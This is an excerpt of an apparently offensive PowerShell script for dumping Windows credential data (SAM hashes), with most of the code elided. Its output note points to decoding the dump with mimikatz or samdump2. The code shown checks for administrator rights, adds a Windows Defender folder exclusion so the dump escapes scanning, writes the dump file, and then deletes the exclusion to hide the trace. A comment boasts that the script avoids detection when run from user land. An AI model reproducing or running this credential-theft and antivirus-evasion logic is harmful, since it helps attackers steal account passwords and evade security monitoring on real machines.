...
.OUTPUTS
   ...
   * Done - 00:52:14 - Decode with mim[i]ka[t]z\samdump2 ..
...
If($IsClientAdmin -iMatch 'True')
{
   If([bool](Get-Service -Name "WinDefend") -iMatch 'True')
   {
      ...
      If([bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Set-MpPreference") -iMatch 'True')
      {
         ...
         write-host "  *" -ForegroundColor Green -NoNewline
         write-host " Created folder exclusion in Defender."
      ...
      Else
      {
         ...
         write-host " Fail to create folder exclusion (Defender)"
         Start-Sleep -Seconds 1
         $Exclusion = "False"      
      }
   }
...
## Does not trigger detection if exec in UserLand
...
$PDP = Join-Path $Storage $FileName
$FileMode = New-Object IO.FileStream($PDP, [IO.FileMode]::Create)
...
If($Exclusion -iMatch "True")
{
   ...
   write-host "  *" -ForegroundColor Green -NoNewline
   write-host " Deleted folder exclusion from Defender."
   Start-Sleep -Seconds 1
}
